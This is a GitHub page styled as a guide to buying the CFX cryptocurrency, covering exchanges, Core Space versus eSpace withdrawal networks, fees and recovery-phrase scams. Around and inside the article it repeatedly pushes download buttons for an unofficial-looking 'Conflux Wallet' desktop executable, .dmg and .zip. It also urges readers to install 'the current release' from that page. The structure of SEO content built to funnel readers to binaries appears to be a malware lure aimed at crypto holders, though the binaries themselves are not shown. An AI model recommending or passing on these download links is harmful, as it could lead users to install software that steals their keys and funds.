![Conflux Wallet](assets/banner-article.png)

# How to Buy CFX

<p align="center">How to Buy CFX: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** CFX is bought on exchanges, not in a wallet: you create an account, complete the exchange's identity checks, buy CFX, then withdraw it to your own address. The withdrawal is where most losses happen, because the network you select has to match the address format you paste.

## The short route

Four steps. An exchange account with identity verification, a purchase of CFX on that exchange, a wallet address of your own, and a withdrawal from the exchange to that address on the right network.

Everything before the last step happens inside somebody else's system. The last step is the one that moves an asset into your custody, and it is the only one where a mistake is permanent.

## Where CFX is sold

On the large centralised exchanges, and on some smaller regional ones. Binance is the best-known venue that lists it; others list it in pairs against USDT or BTC. Availability depends on your country and on the exchange's own licensing, which is why no single list stays accurate for long.

A decentralised exchange on eSpace is a second route, and it requires you to already hold something on that network - which makes it an advanced option rather than a first purchase.

## Buying and withdrawing are different steps

Buying puts a number in an exchange account. That number is a claim on the exchange, not CFX in your possession: if the exchange freezes withdrawals or fails, the balance is only as good as the company.

Withdrawing moves actual CFX to an address whose keys you hold. That is the step that makes it yours, and it is the step people skip because the balance already looks like theirs. https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md describes the wallet that holds it once it is out.

## Choosing the network on withdrawal

The exchange will offer one or more Conflux networks, and the choice has to match the address. A `cfx:` address belongs to Core Space; a `0x` address belongs to eSpace. Paste one while the other network is selected and a good form rejects it.

A bad one accepts it and routes the funds to a network that cannot credit them. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md is the check to run before confirming, and https://github.com/conflux-developments/recovery-playbook/blob/HEAD/receiving-cfx-in-conflux-wallet.md covers the receiving side.

## What it costs

Three costs, and they are not the same thing. The exchange's trading fee, charged on the purchase. A withdrawal fee, charged to move CFX out, which varies by venue and network. And network gas, which the wallet pays when you later move the CFX yourself.

The withdrawal fee is the one people forget when comparing exchanges: a venue with cheap trades and an expensive withdrawal can be the more costly choice for someone buying to hold.

## "CFX" in foreign exchange

Worth separating, because the search exists. In currency markets CFX is not a traded pair, and in financial documents the letters are usually shorthand local to that document rather than a standard measure. If you arrived looking for a currency product, this is a different asset entirely.

https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-network-and-cfx-explained.md covers the other meanings of the same three letters, from engineering software to media handles.

## What this page will not do

It will not tell you whether to buy, how much, or when. That is not caution for its own sake: an answer would depend on your circumstances, your other holdings and your tolerance for loss, none of which a product page can know.

It also will not quote a price. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-price-today.md explains why a written figure is the wrong shape of answer, and what to check on a live quote instead.

## After you buy

Withdraw to your own address, confirm it arrived, and then decide whether it stays on Core Space or moves to eSpace - the two are separate accounts, and CFX on one is not visible on the other. If you intend to stake, Core Space is where that happens.

A small test withdrawal first is not paranoia; it is the cheapest possible check that the network and address agree before a meaningful amount is at stake. The app you receive into is actively maintained, so the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is the one to install - and the fee you pay on a small test is trivial next to the alternative.

## Safety

Buy from a venue you chose, not from a link in a message or an advertisement. No exchange, wallet or support channel needs your recovery phrase, and no legitimate purchase flow asks you to "validate" a wallet by entering one.

If someone offers to buy CFX for you, to trade on your behalf, or to recover funds you have not lost, the offer is the attack. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-cfx-wrong-network.md covers the one mistake that genuinely cannot be fixed by asking nicely.

## FAQ

### How do I buy CFX?

Open an account on an exchange that lists it, complete identity verification, buy CFX, then withdraw it to your own `cfx:` or `0x` address on the matching network.

### Where can I buy CFX?

On the large centralised exchanges - Binance among them - and some regional venues. Availability depends on your country and the exchange's licensing.

### Can I buy CFX directly in the wallet?

No. The wallet is not an exchange: it does not hold funds for you or set prices. It receives what you withdraw and signs what you send.

### Which network should I withdraw on?

The one that matches your address: Core Space for `cfx:`, eSpace for `0x`. A rejection is harmless; a wrong acceptance is not.

### Is buying CFX an investment?

That is a decision for you, not a product page. This article covers the mechanics of buying and taking custody, not whether you should.

### Why is my CFX not showing after I bought it?

It is still on the exchange until you withdraw it, and after withdrawal it appears only on the space you sent it to.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md)
- [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md)
- [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
